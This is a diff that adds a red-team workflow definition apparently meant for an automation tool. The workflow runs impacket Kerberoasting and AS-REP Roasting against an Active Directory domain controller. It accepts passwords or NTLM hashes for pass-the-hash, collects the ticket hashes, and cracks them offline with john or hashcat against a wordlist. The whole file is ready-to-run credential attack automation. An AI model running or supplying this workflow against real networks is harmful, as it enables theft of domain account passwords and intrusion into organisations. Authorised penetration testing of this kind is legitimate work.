@@ -1,0 +1,127 @@
+name: kerberoast
+description: |
+  Kerberos attack workflow — discover and exploit Kerberoastable and
+  AS-REP Roastable accounts in Active Directory using impacket tools,
+  then attempt offline cracking of extracted hashes.
+tags: [redteam, ad, kerberos, kerberoast, asrep]
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Domain controller IP
+      alias: t
+    domain:
+      required: true
+      type: string
+      description: Domain name (e.g. corp.local)
+    user:
+      required: true
+      type: string
+      description: Domain username
+    password:
+      type: string
+      default: ''
+      description: Password
+    hash:
+      type: string
+      default: ''
+      description: NTLM hash for pass-the-hash
+    wordlist:
+      type: string
+      default: /usr/share/wordlists/rockyou.txt
+      description: Wordlist for cracking
+
+jobs:
+  kerberoast:
+    name: Kerberoasting
+    steps:
+    - name: get-spn-tickets
+      run: |
+        echo "[+] Kerberoasting {{ inputs.domain }}..."
+        AUTH="{{ inputs.domain }}/{{ inputs.user }}"
+        {% if inputs.password %}
+        AUTH="$AUTH:{{ inputs.password }}"
+        {% endif %}
+        EXTRA=""
+        {% if inputs.hash %}
+        EXTRA="-hashes :{{ inputs.hash }}"
+        {% endif %}
+
+        impacket-GetUserSPNs "$AUTH" -dc-ip {{ inputs.target }} -request -outputfile /tmp/ofx_kerberoast.txt $EXTRA 2>&1 | tee /tmp/ofx_kerberoast_log.txt
+
+        if [ -f /tmp/ofx_kerberoast.txt ]; then
+          COUNT=$(wc -l < /tmp/ofx_kerberoast.txt)
+          echo "hash_count=$COUNT" >> {{ env.OFX_OUTPUTS }}
+          echo "hash_file=/tmp/ofx_kerberoast.txt" >> {{ env.OFX_OUTPUTS }}
+          echo "[+] Got $COUNT TGS hashes"
+        else
+          echo "hash_count=0" >> {{ env.OFX_OUTPUTS }}
+          echo "[-] No kerberoastable accounts found"
+        fi
+      log-stdout: true
+      continue-on-error: true
+
+  asrep-roast:
+    name: AS-REP Roasting
+    steps:
+    - name: get-asrep-hashes
+      run: |
+        echo "[+] AS-REP Roasting {{ inputs.domain }}..."
+        AUTH="{{ inputs.domain }}/{{ inputs.user }}"
+        {% if inputs.password %}
+        AUTH="$AUTH:{{ inputs.password }}"
+        {% endif %}
+        EXTRA=""
+        {% if inputs.hash %}
+        EXTRA="-hashes :{{ inputs.hash }}"
+        {% endif %}
+
+        impacket-GetNPUsers "$AUTH" -dc-ip {{ inputs.target }} -request -outputfile /tmp/ofx_asrep.txt $EXTRA 2>&1 | tee /tmp/ofx_asrep_log.txt
+
+        if [ -f /tmp/ofx_asrep.txt ]; then
+          COUNT=$(wc -l < /tmp/ofx_asrep.txt)
+          echo "asrep_count=$COUNT" >> {{ env.OFX_OUTPUTS }}
+          echo "asrep_file=/tmp/ofx_asrep.txt" >> {{ env.OFX_OUTPUTS }}
+          echo "[+] Got $COUNT AS-REP hashes"
+        else
+          echo "asrep_count=0" >> {{ env.OFX_OUTPUTS }}
+          echo "[-] No AS-REP roastable accounts found"
+        fi
+      log-stdout: true
+      continue-on-error: true
+
+  crack:
+    name: Hash Cracking
+    needs: [kerberoast, asrep-roast]
+    steps:
+    - name: crack-hashes
+      run: |
+        echo "[+] Attempting offline crack..."
+
+        # Kerberoast hashes (hashcat mode 13100)
+        {% if jobs['kerberoast'].outputs.hash_count | default(0, true) | int > 0 %}
+        echo "--- Kerberoast (TGS) ---"
+        if command -v john &>/dev/null; then
+          john --wordlist={{ inputs.wordlist }} /tmp/ofx_kerberoast.txt 2>/dev/null
+          john --show /tmp/ofx_kerberoast.txt 2>/dev/null | tee /tmp/ofx_kerberoast_cracked.txt
+        elif command -v hashcat &>/dev/null; then
+          hashcat -m 13100 /tmp/ofx_kerberoast.txt {{ inputs.wordlist }} --force -o /tmp/ofx_kerberoast_cracked.txt 2>/dev/null || true
+        fi
+        {% endif %}
+
+        # AS-REP hashes (hashcat mode 18200)
+        {% if jobs['asrep-roast'].outputs.asrep_count | default(0, true) | int > 0 %}
+        echo "--- AS-REP ---"
+        if command -v john &>/dev/null; then
+          john --wordlist={{ inputs.wordlist }} /tmp/ofx_asrep.txt 2>/dev/null
+          john --show /tmp/ofx_asrep.txt 2>/dev/null | tee /tmp/ofx_asrep_cracked.txt
+        elif command -v hashcat &>/dev/null; then
+          hashcat -m 18200 /tmp/ofx_asrep.txt {{ inputs.wordlist }} --force -o /tmp/ofx_asrep_cracked.txt 2>/dev/null || true
+        fi
+        {% endif %}
+
+        echo "[+] Cracking complete"
+      log-stdout: true
+      continue-on-error: true
+      timeout: 30
